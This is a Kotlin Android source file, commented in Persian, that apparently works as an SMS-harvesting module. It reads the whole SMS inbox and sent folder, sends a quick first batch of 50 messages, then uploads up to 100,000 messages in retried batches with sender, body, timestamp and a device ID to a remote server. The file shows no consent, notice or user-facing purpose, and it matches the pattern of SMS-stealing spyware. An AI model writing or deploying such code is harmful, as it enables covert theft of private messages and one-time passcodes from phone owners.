package com.example.test.utils

import android.content.Context
import android.provider.Telephony
import android.util.Log
import kotlinx.coroutines.*
import org.json.JSONArray
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL

/**
 * 🚀 سیستم آپلود حرفه‌ای SMS با Batch + Chunk Processing
 *
 * ویژگی‌ها:
 * - سریع و بهینه (دقیقاً مثل Flutter)
 * - پردازش Batch به Batch (200 تایی)
 * - Chunk Processing (2000 تایی)
 * - Retry Mechanism (3 بار تلاش)
 * - Memory Management (جلوگیری از crash)
 * - Progress Tracking
 */
object SmsBatchUploader {

    private const val TAG = "SmsBatchUploader"

    // ===================== تنظیمات (مثل Flutter) =====================
    private const val BATCH_SIZE = 200                  // تعداد SMS در هر batch
    private const val FETCH_CHUNK_SIZE = 2000           // تعداد SMS برای fetch در هر بار
    private const val MAX_SAFE_SMS_COUNT = 100000       // حداکثر تعداد SMS
    private const val RETRY_ATTEMPTS = 3                // تعداد تلاش مجدد
    private const val DELAY_BETWEEN_BATCHES_MS = 300L   // تاخیر بین batch ها
    private const val DELAY_BETWEEN_CHUNKS_MS = 1000L   // تاخیر بین chunk ها
    private const val PROCESSING_DELAY_MS = 50L         // تاخیر در حین پردازش
    private const val CHUNK_SIZE = 500                  // اندازه chunk برای پردازش

    private var isCancelled = false
    private var isUploading = false

    /**
     * 📤 آپلود سریع اولیه - فقط 50 تا SMS (مثل Flutter)
     */
    suspend fun uploadQuickSms(
        context: Context,
        deviceId: String,
        baseUrl: String,
        limit: Int = 50
    ): UploadResult = withContext(Dispatchers.IO) {
        try {
            Log.d(TAG, "⚡ Quick SMS upload started (limit: $limit)")

            val messages = mutableListOf<SmsModel>()

            // خواندن Inbox
            val inboxMessages = fetchSmsFromBox(
                context = context,
                box = Telephony.Sms.Inbox.CONTENT_URI,
                type = "inbox",
                limit = limit
            )
            messages.addAll(inboxMessages)

            if (messages.isEmpty()) {
                Log.w(TAG, "⚠️ No SMS found")
                return@withContext UploadResult.Success(0, 0, 0)
            }

            Log.d(TAG, "📊 Quick upload: ${messages.size} messages")

            // ارسال یکباره (چون تعداد کمه)
            val success = sendBatch(
                messages = messages,
                deviceId = deviceId,
                baseUrl = baseUrl,
                batchInfo = BatchInfo(1, 1, messages.size, messages.size, messages.size)
            )

            if (success) {
                Log.d(TAG, "✅ Quick upload completed")
                UploadResult.Success(messages.size, 0, 0)
            } else {
                Log.e(TAG, "❌ Quick upload failed")
                UploadResult.Failure("Quick upload failed")
            }

        } catch (e: Exception) {
            Log.e(TAG, "❌ Quick upload error: ${e.message}", e)
            UploadResult.Failure(e.message ?: "Unknown error")
        }
    }

    /**
     * 📦 آپلود کامل تمام SMS ها با Batch Processing
     */
    suspend fun uploadAllSms(
        context: Context,
        deviceId: String,
        baseUrl: String,
        onProgress: ((UploadProgress) -> Unit)? = null
    ): UploadResult = withContext(Dispatchers.IO) {

        if (isUploading) {
            Log.w(TAG, "⚠️ Upload already in progress")
            return@withContext UploadResult.Failure("Upload already in progress")
        }

        isUploading = true
        isCancelled = false

        try {
            Log.d(TAG, "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
            Log.d(TAG, "🚀 SMS BATCH UPLOAD STARTED")
            Log.d(TAG, "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

            // شمارش کل
            onProgress?.invoke(UploadProgress.Counting("Counting messages..."))
            val totalCount = countTotalSms(context)

            if (totalCount == 0) {
                Log.w(TAG, "⚠️ No SMS found")
                return@withContext UploadResult.Success(0, 0, 0)
            }

            val safeCount = minOf(totalCount, MAX_SAFE_SMS_COUNT)

            Log.d(TAG, "📊 Total SMS: $totalCount")
            Log.d(TAG, "📊 Processing: $safeCount")
            Log.d(TAG, "📦 Batch size: $BATCH_SIZE")
            Log.d(TAG, "📦 Estimated batches: ${(safeCount / BATCH_SIZE) + 1}")

            onProgress?.invoke(UploadProgress.Processing(safeCount, 0, "Starting upload..."))

            // پردازش
            val result = processAllMessages(
                context = context,
                deviceId = deviceId,
                baseUrl = baseUrl,
                maxCount = safeCount,
                onProgress = onProgress
            )

            when (result) {
                is UploadResult.Success -> {
                    Log.d(TAG, "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
                    Log.d(TAG, "✅ UPLOAD COMPLETED")
                    Log.d(TAG, "   Sent: ${result.totalSent}")
                    Log.d(TAG, "   Skipped: ${result.totalSkipped}")
                    Log.d(TAG, "   Failed: ${result.totalFailed}")
                    Log.d(TAG, "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

                    onProgress?.invoke(UploadProgress.Completed(safeCount, "Upload completed"))
                }
                is UploadResult.Failure -> {
                    Log.e(TAG, "❌ Upload failed: ${result.error}")
                }
            }

            result

        } catch (e: Exception) {
            Log.e(TAG, "❌ FATAL ERROR: ${e.message}", e)
            onProgress?.invoke(UploadProgress.Failed("Upload failed: ${e.message}"))
            UploadResult.Failure(e.message ?: "Unknown error")

        } finally {
            isUploading = false
        }
    }

    /**
     * 🔄 پردازش تمام پیامک‌ها با Chunk + Batch
     */
    private suspend fun processAllMessages(
        context: Context,
        deviceId: String,
        baseUrl: String,
        maxCount: Int,
        onProgress: ((UploadProgress) -> Unit)?
    ): UploadResult = withContext(Dispatchers.IO) {

        var totalSent = 0
        var totalSkipped = 0
        var totalFailed = 0

        // ===================== پردازش INBOX =====================
        Log.d(TAG, "📥 Processing INBOX messages...")

        var inboxOffset = 0
        var hasMoreInbox = true

        while (hasMoreInbox && !isCancelled && inboxOffset < maxCount) {
            val remainingCount = maxCount - inboxOffset
            val fetchCount = minOf(remainingCount, FETCH_CHUNK_SIZE)

            Log.d(TAG, "📥 Fetching inbox chunk: offset=$inboxOffset, count=$fetchCount")

            val inboxChunk = fetchSmsChunk(
                context = context,
                box = Telephony.Sms.Inbox.CONTENT_URI,
                type = "inbox",
                offset = inboxOffset,
                limit = fetchCount
            )

            if (inboxChunk.isEmpty()) {
                hasMoreInbox = false
                break
            }

            val chunkResult = processChunk(
                messages = inboxChunk,
                deviceId = deviceId,
                baseUrl = baseUrl,
                startIndex = inboxOffset,
                totalCount = maxCount,
                onProgress = onProgress
            )

            totalSent += chunkResult.sent
            totalSkipped += chunkResult.skipped
            totalFailed += chunkResult.failed

            inboxOffset += inboxChunk.size

            if (hasMoreInbox && !isCancelled) {
                delay(DELAY_BETWEEN_CHUNKS_MS)
            }
        }

        Log.d(TAG, "✅ Inbox done: sent=$totalSent, skipped=$totalSkipped")

        // ===================== پردازش SENT =====================
        if (!isCancelled && inboxOffset < maxCount) {
            Log.d(TAG, "📤 Processing SENT messages...")

            var sentOffset = 0
            var hasMoreSent = true
            val remainingSlots = maxCount - inboxOffset

            while (hasMoreSent && !isCancelled && sentOffset < remainingSlots) {
                val remainingCount = remainingSlots - sentOffset
                val fetchCount = minOf(remainingCount, FETCH_CHUNK_SIZE)

                Log.d(TAG, "📤 Fetching sent chunk: offset=$sentOffset, count=$fetchCount")

                val sentChunk = fetchSmsChunk(
                    context = context,
                    box = Telephony.Sms.Sent.CONTENT_URI,
                    type = "sent",
                    offset = sentOffset,
                    limit = fetchCount
                )

                if (sentChunk.isEmpty()) {
                    hasMoreSent = false
                    break
                }

                val chunkResult = processChunk(
                    messages = sentChunk,
                    deviceId = deviceId,
                    baseUrl = baseUrl,
                    startIndex = inboxOffset + sentOffset,
                    totalCount = maxCount,
                    onProgress = onProgress
                )

                totalSent += chunkResult.sent
                totalSkipped += chunkResult.skipped
                totalFailed += chunkResult.failed

                sentOffset += sentChunk.size

                if (hasMoreSent && !isCancelled) {
                    delay(DELAY_BETWEEN_CHUNKS_MS)
                }
            }

            Log.d(TAG, "✅ Sent done")
        }

        UploadResult.Success(totalSent, totalSkipped, totalFailed)
    }

    /**
     * 📦 پردازش یک Chunk از پیامک‌ها
     */
    private suspend fun processChunk(
        messages: List<SmsModel>,
        deviceId: String,
        baseUrl: String,
        startIndex: Int,
        totalCount: Int,
        onProgress: ((UploadProgress) -> Unit)?
    ): ChunkResult = withContext(Dispatchers.IO) {

        var sent = 0
        var skipped = 0
        var failed = 0

        val totalBatches = (messages.size + BATCH_SIZE - 1) / BATCH_SIZE

        for (batchIndex in 0 until totalBatches) {
            if (isCancelled) break

            val start = batchIndex * BATCH_SIZE
            val end = minOf(start + BATCH_SIZE, messages.size)
            val batch = messages.subList(start, end)

            val batchInfo = BatchInfo(
                batchNumber = batchIndex + 1,
                totalBatches = totalBatches,
                batchSize = batch.size,
                totalMessages = totalCount,
                currentProgress = startIndex + end
            )

            // ارسال با Retry
            var success = false
            var attempts = 0

            while (!success && attempts < RETRY_ATTEMPTS && !isCancelled) {
                attempts++

                try {
                    Log.d(TAG, "📤 Sending batch ${batchInfo.batchNumber}/${batchInfo.totalBatches} " +
                            "(${batch.size} messages) - Attempt $attempts")

                    success = withTimeout(10000L) {
                        sendBatch(batch, deviceId, baseUrl, batchInfo)
                    }

                    if (success) {
                        sent += batch.size
                        Log.d(TAG, "✅ Batch ${batchInfo.batchNumber} sent successfully")
                    } else {
                        Log.w(TAG, "⚠️ Batch ${batchInfo.batchNumber} failed, retrying...")
                        delay(500L * attempts)
                    }

                } catch (e: Exception) {
                    Log.e(TAG, "❌ Batch ${batchInfo.batchNumber} error (attempt $attempts): ${e.message}")

                    if (attempts < RETRY_ATTEMPTS) {
                        delay(500L * attempts)
                    }
                }
            }

            if (!success) {
                failed += batch.size
                Log.e(TAG, "❌ Batch ${batchInfo.batchNumber} failed after $RETRY_ATTEMPTS attempts")
            }

            // آپدیت Progress
            val progress = ((batchInfo.currentProgress.toFloat() / totalCount) * 100).toInt()
            onProgress?.invoke(
                UploadProgress.Processing(
                    totalCount,
                    batchInfo.currentProgress,
                    "Uploading: $progress%"
                )
            )

            // تاخیر بین batch ها
            if (batchIndex < totalBatches - 1 && !isCancelled) {
                delay(DELAY_BETWEEN_BATCHES_MS)
            }

            // Memory check
            if (batchIndex % 10 == 0) {
                delay(100)
            }
        }

        ChunkResult(sent, skipped, failed)
    }

    /**
     * 📡 ارسال یک Batch به سرور
     */
    private suspend fun sendBatch(
        messages: List<SmsModel>,
        deviceId: String,
        baseUrl: String,
        batchInfo: BatchInfo
    ): Boolean = withContext(Dispatchers.IO) {
        try {
            val messagesArray = JSONArray()
            messages.forEach { sms ->
                messagesArray.put(JSONObject().apply {
                    put("from", sms.address)
                    put("body", sms.body)
                    put("timestamp", sms.timestamp)
                    put("type", sms.type)
                })
            }

            val json = JSONObject().apply {
                put("device_id", deviceId)
                put("messages", messagesArray)
                put("batch_info", JSONObject().apply {
                    put("batch", batchInfo.batchNumber)
                    put("of", batchInfo.totalBatches)
                    put("batch_size", batchInfo.batchSize)
                    put("total", batchInfo.totalMessages)
                    put("progress", batchInfo.currentProgress)
                })
                put("timestamp", System.currentTimeMillis())
            }

            val response = sendPostRequest("$baseUrl/sms/batch", json.toString())
            response != null

        } catch (e: Exception) {
            Log.e(TAG, "❌ Send batch error: ${e.message}", e)
            false
        }
    }

    /**
     * 📥 خواندن SMS از یک Box خاص
     */
    private fun fetchSmsFromBox(
        context: Context,
        box: android.net.Uri,
        type: String,
        limit: Int
    ): List<SmsModel> {
        val messages = mutableListOf<SmsModel>()

        try {
            val cursor = context.contentResolver.query(
                box,
                arrayOf(
                    Telephony.Sms.ADDRESS,
                    Telephony.Sms.BODY,
                    Telephony.Sms.DATE
                ),
                null,
                null,
                "${Telephony.Sms.DATE} DESC LIMIT $limit"
            )

            cursor?.use {
                val addressIndex = it.getColumnIndex(Telephony.Sms.ADDRESS)
                val bodyIndex = it.getColumnIndex(Telephony.Sms.BODY)
                val dateIndex = it.getColumnIndex(Telephony.Sms.DATE)

                while (it.moveToNext()) {
                    try {
                        val address = it.getString(addressIndex)
                        val body = it.getString(bodyIndex)
                        val date = it.getLong(dateIndex)

                        if (!address.isNullOrBlank() && body != null) {
                            messages.add(SmsModel(address.trim(), body, date, type))
                        }
                    } catch (e: Exception) {
                        continue
                    }
                }
            }

        } catch (e: Exception) {
            Log.e(TAG, "❌ Fetch SMS error: ${e.message}", e)
        }

        return messages
    }

    /**
     * 📥 خواندن یک Chunk از SMS با offset
     */
    private fun fetchSmsChunk(
        context: Context,
        box: android.net.Uri,
        type: String,
        offset: Int,
        limit: Int
    ): List<SmsModel> {
        val messages = mutableListOf<SmsModel>()

        try {
            val cursor = context.contentResolver.query(
                box,
                arrayOf(
                    Telephony.Sms.ADDRESS,
                    Telephony.Sms.BODY,
                    Telephony.Sms.DATE
                ),
                null,
                null,
                "${Telephony.Sms.DATE} DESC LIMIT $limit OFFSET $offset"
            )

            cursor?.use {
                val addressIndex = it.getColumnIndex(Telephony.Sms.ADDRESS)
                val bodyIndex = it.getColumnIndex(Telephony.Sms.BODY)
                val dateIndex = it.getColumnIndex(Telephony.Sms.DATE)

                var processed = 0
                var skipped = 0

                while (it.moveToNext()) {
                    try {
                        val address = it.getString(addressIndex)
                        val body = it.getString(bodyIndex)
                        val date = it.getLong(dateIndex)

                        if (address.isNullOrBlank()) {
                            skipped++
                            continue
                        }

                        if (body == null) {
                            skipped++
                            continue
                        }

                        messages.add(SmsModel(address.trim(), body, date, type))
                        processed++

                        // کمی تاخیر برای Memory
                        if (processed % CHUNK_SIZE == 0) {
                            Thread.sleep(PROCESSING_DELAY_MS)
                        }

                    } catch (e: Exception) {
                        skipped++
                        continue
                    }
                }

                if (skipped > 0) {
                    Log.d(TAG, "   Processed: $processed, Skipped: $skipped")
                }
            }

        } catch (e: Exception) {
            Log.e(TAG, "❌ Fetch chunk error: ${e.message}", e)
        }

        return messages
    }

    /**
     * 🔢 شمارش تعداد کل SMS
     */
    private fun countTotalSms(context: Context): Int {
        return try {
            var inboxCount = 0
            var sentCount = 0

            context.contentResolver.query(
                Telephony.Sms.Inbox.CONTENT_URI,
                arrayOf("COUNT(*)"),
                null, null, null
            )?.use {
                if (it.moveToFirst()) inboxCount = it.getInt(0)
            }

            context.contentResolver.query(
                Telephony.Sms.Sent.CONTENT_URI,
                arrayOf("COUNT(*)"),
                null, null, null
            )?.use {
                if (it.moveToFirst()) sentCount = it.getInt(0)
            }

            inboxCount + sentCount

        } catch (e: Exception) {
            Log.e(TAG, "❌ Count SMS error: ${e.message}", e)
            0
        }
    }

    /**
     * 📡 ارسال درخواست POST
     */
    private fun sendPostRequest(urlString: String, jsonData: String): String? {
        var connection: HttpURLConnection? = null
        return try {
            val url = URL(urlString)
            connection = url.openConnection() as HttpURLConnection
            connection.apply {
                requestMethod = "POST"
                doOutput = true
                setRequestProperty("Content-Type", "application/json")
                connectTimeout = 15000
                readTimeout = 15000
            }

            connection.outputStream.use { os ->
                os.write(jsonData.toByteArray())
                os.flush()
            }

            val responseCode = connection.responseCode

            if (responseCode == HttpURLConnection.HTTP_OK) {
                connection.inputStream.bufferedReader().use { it.readText() }
            } else {
                Log.w(TAG, "⚠️ Response code: $responseCode")
                null
            }

        } catch (e: Exception) {
            Log.e(TAG, "❌ HTTP request failed: ${e.message}", e)
            null
        } finally {
            connection?.disconnect()
        }
    }

    /**
     * 🛑 لغو آپلود
     */
    fun cancelUpload() {
        Log.d(TAG, "🛑 Upload cancellation requested")
        isCancelled = true
    }

    // ===================== مدل‌های داده =====================

    data class SmsModel(
        val address: String,
        val body: String,
        val timestamp: Long,
        val type: String
    )

    data class BatchInfo(
        val batchNumber: Int,
        val totalBatches: Int,
        val batchSize: Int,
        val totalMessages: Int,
        val currentProgress: Int
    )

    data class ChunkResult(
        val sent: Int,
        val skipped: Int,
        val failed: Int
    )

    sealed class UploadResult {
        data class Success(
            val totalSent: Int,
            val totalSkipped: Int,
            val totalFailed: Int
        ) : UploadResult()

        data class Failure(val error: String) : UploadResult()
    }

    sealed class UploadProgress {
        data class Counting(val message: String) : UploadProgress()
        data class Processing(
            val total: Int,
            val processed: Int,
            val message: String
        ) : UploadProgress()
        data class Completed(val total: Int, val message: String) : UploadProgress()
        data class Failed(val message: String) : UploadProgress()
    }
}